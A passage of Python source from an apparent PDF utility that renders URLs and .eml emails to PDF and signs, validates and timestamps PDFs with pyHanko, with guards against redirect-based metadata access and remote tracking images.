                        result["note"] = "rendered URL → PDF (via %s)" % used
                    except Exception:
                        if engine == "chrome":
                            raise
                if not result.get("changed") and engine in ("auto", "weasyprint"):
                    try:
                        import weasyprint
                        weasyprint.HTML(url=str(url)).write_pdf(out_pdf)
                        result["changed"] = True
                        result["note"] = "rendered URL → PDF (via weasyprint)"
                    except Exception:
                        if engine == "weasyprint":
                            raise
                if not result.get("changed"):
                    import urllib.request

                    class _GuardedRedirect(urllib.request.HTTPRedirectHandler):
                        """Re-check every hop: a public URL may 302 into the metadata
                        endpoint, and only the first one was validated above."""

                        def redirect_request(self, req, fp, code, msg, headers, newurl):
                            _assert_fetchable_url(newurl)
                            return super().redirect_request(req, fp, code, msg, headers, newurl)

                    opener = urllib.request.build_opener(_GuardedRedirect)
                    req_ = urllib.request.Request(str(url), headers={"User-Agent": "Mozilla/5.0 LynxPDFStudio"})
                    with opener.open(req_, timeout=30) as resp:
                        html = resp.read().decode("utf-8", "replace")
                    used = _render_html_to_pdf(html, out_pdf, "story", base_url=str(url),
                                               sanitize=_sanitize_flag(params))
                    result["changed"] = True
                    result["note"] = "rendered URL → PDF (via %s)" % used

        elif op == "eml_to_pdf":
            if _looks_like_pdf(in_pdf):
                raise ValueError("eml_to_pdf expects an .eml input, but got a PDF — make it the first operation with an .eml input")
            import email
            import email.policy
            import html as _h
            with open(in_pdf, "rb") as f:
                msg = email.message_from_binary_file(f, policy=email.policy.default)
            body = msg.get_body(preferencelist=("html", "plain"))
            content = ""
            if body is not None:
                content = body.get_content()
                if body.get_content_type() == "text/plain":
                    content = "<pre>%s</pre>" % _h.escape(content)
            header = "<div><p><b>From:</b> %s<br><b>To:</b> %s<br><b>Subject:</b> %s<br><b>Date:</b> %s</p><hr></div>" % (
                _h.escape(str(msg.get("From", ""))),
                _h.escape(str(msg.get("To", ""))),
                _h.escape(str(msg.get("Subject", ""))),
                _h.escape(str(msg.get("Date", ""))),
            )
            subject = str(msg.get("Subject", "") or "email")
            # Email is untrusted (from anyone): block remote resources by default so the
            # renderer can't fetch tracking pixels (leaking "opened" + your IP). Set
            # load_remote_images: true to restore them for a source you trust.
            used = _render_html_to_pdf(_html_document(header + content, title=subject), out_pdf, params.get("engine"),
                                       sanitize=_sanitize_flag(params),
                                       block_remote=not bool(params.get("load_remote_images", False)))
            result["changed"] = True
            result["note"] = "rendered email → PDF (via %s)" % used

        elif op == "sign":
            try:
                from pyhanko.sign import signers
                from pyhanko.pdf_utils.incremental_writer import IncrementalPdfFileWriter
            except Exception as e:  # noqa: BLE001
                result = {"ok": False, "error": "pyHanko not installed: %s (pip install pyhanko)" % e}
            else:
                cert_rel = _safe_rel(params.get("cert"))
                if not cert_rel or not os.path.exists(cert_rel):
                    result = {"ok": False, "error": "sign requires cert: <path to a .p12/.pfx file>"}
                else:
                    try:
                        pw = params.get("password")
                        pw_bytes = pw.encode() if isinstance(pw, str) and pw else None
                        signer = signers.SimpleSigner.load_pkcs12(pfx_file=cert_rel, passphrase=pw_bytes)
                        if signer is None:
                            result = {"ok": False, "error": "sign: could not load certificate (wrong password?)"}
                        else:
                            meta = signers.PdfSignatureMetadata(
                                field_name=str(params.get("field") or "Signature1"),
                                reason=str(params.get("reason") or ""),
                            )
                            with open(in_pdf, "rb") as inf:
                                w = IncrementalPdfFileWriter(inf)
                                with open(out_pdf, "wb") as outf:
                                    signers.sign_pdf(w, meta, signer=signer, output=outf)
                            result["changed"] = True
                            result["note"] = "signed with certificate"
                    except Exception as e:  # noqa: BLE001
                        result = {"ok": False, "error": "sign failed: %s" % e}

        elif op == "validate_signature":
            try:
                from pyhanko.pdf_utils.reader import PdfFileReader
                from pyhanko.sign.validation import validate_pdf_signature
            except Exception as e:  # noqa: BLE001
                result = {"ok": False, "error": "pyHanko not installed: %s" % e}
            else:
                to = params.get("to") or "output/signatures.json"
                report = []
                with open(in_pdf, "rb") as inf:
                    r = PdfFileReader(inf)
                    for sig in r.embedded_signatures:
                        try:
                            status = validate_pdf_signature(sig)
                            report.append({
                                "field": sig.field_name,
                                "intact": bool(getattr(status, "intact", False)),
                                "valid": bool(getattr(status, "valid", False)),
                                "trusted": bool(getattr(status, "trusted", False)),
                                "signer": str(getattr(status, "signer_reported_dn", "") or ""),
                            })
                        except Exception as e:  # noqa: BLE001
                            report.append({"field": getattr(sig, "field_name", "?"), "error": str(e)})
                with open(os.path.join(art_dir, "signatures.json"), "w", encoding="utf-8") as f:
                    json.dump(report, f, indent=2, ensure_ascii=False)
                result["artifacts"].append({"tmp": "signatures.json", "path": to, "kind": "json"})
                result["note"] = "validated %d signature(s)" % len(report)

        elif op == "timestamp":
            try:
                from pyhanko.sign import signers, timestamps
                from pyhanko.pdf_utils.incremental_writer import IncrementalPdfFileWriter
            except Exception as e:  # noqa: BLE001
                result = {"ok": False, "error": "pyHanko not installed: %s" % e}
            else:
                tsa = params.get("tsa_url")
                if not tsa:
                    result = {"ok": False, "error": "timestamp requires tsa_url (an RFC-3161 timestamp server)"}
                else:
                    try:
                        ts = timestamps.HTTPTimeStamper(str(tsa))
                        with open(in_pdf, "rb") as inf:
                            w = IncrementalPdfFileWriter(inf)
                            with open(out_pdf, "wb") as outf:
                                signers.PdfTimeStamper(ts).timestamp_pdf(w, "sha256", output=outf)
                        result["changed"] = True
                        result["note"] = "added RFC-3161 document timestamp"
                    except Exception as e:  # noqa: BLE001
                        result = {"ok": False, "error": "timestamp failed: %s (is the TSA reachable?)" % e}

        else:
            result = {"ok": False, "error": "unsupported op: %s" % op}
    except Exception as e:  # noqa: BLE001
        result = {"ok": False, "error": "%s: %s" % (op, e)}

    print(json.dumps(result))


if __name__ == "__main__":
    main()
